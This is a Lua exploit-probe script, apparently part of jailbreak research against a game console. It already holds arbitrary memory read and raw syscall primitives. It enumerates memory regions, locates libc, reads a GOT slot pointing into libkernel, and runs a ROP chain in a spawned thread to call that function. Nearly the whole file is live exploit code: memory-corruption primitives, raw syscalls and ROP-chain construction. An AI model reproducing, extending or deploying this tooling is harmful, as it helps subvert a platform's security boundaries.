-- CRASH_CLASS: HIGH
-- PROBE 652a: call a libkernel function from a Thrd_create thread (a real TCB)
-- libc's first PLT stub (libc+0x108) jumps through GOT slot libc+0x1178C8,
-- which holds a libkernel address (probe 519a). Calling it from the main
-- thread killed the process (620a); a libc thread has a TCB, so try there.
print("=== PROBE 652a: LIBKERNEL CALL FROM A LIBC THREAD ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function rdd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
-- find .libc.prx with sys 674
local buf=memory.alloc(72*512); local cnt=memory.alloc(8)
pcall(function() mk(674)(U(N(buf)), uint64(72), uint64(512), U(N(cnt)), uint64(0x40000000), uint64(0)) end)
local n=N(rd(N(cnt)) or 0)
print(string.format("[A] regions=%d",n))
local libc=nil
for i=0,math.min(n,512)-1 do
    local b=N(buf)+i*72
    local nm=b+0x20
    local s={}
    for k=0,23 do local c=rdd(nm+k); if not c or c==0 then break end s[#s+1]=string.char(c) end
    local name=table.concat(s)
    if name:find("libc") or name:find("Libc") then
        local lo=rdd(b) or 0; local hi=rdd(b+4) or 0
        print(string.format("[B] %s @ %08X%08X prot=%d",name,hi,lo,rdd(b+0x18) or 0))
        if not libc and (rdd(b+0x18) or 0)%2==1 then libc=hi*4294967296+lo end
    end
end
if not libc then print("[X] no readable libc region"); return end
local slot=libc+0x1178C8
local fn=rd(slot)
print(string.format("[C] libc=%X slot=%X fn=%s",libc,slot,tostring(fn)))
local hi=math.floor((fn or 0)/4294967296)
if not fn or hi<8 or hi>0x8FF then print("[X] implausible target"); return end
local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
c:push_fcall_with_ret(fn, uint64(0), uint64(0), uint64(0))
c:push_syscall_with_ret(mk(20))
print("[D] chain built, running")
local t=thread:new(c); t:run(true)
local ok=t:join()
print(string.format("[E] join ok=%s alive=%d",tostring(ok),N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
if c.retval_addr and c.retval_addr[1] then
    print(string.format("[F] fcall ret=%X",rd(N(c.retval_addr[1])) or 0))
end
print("[Z] done")
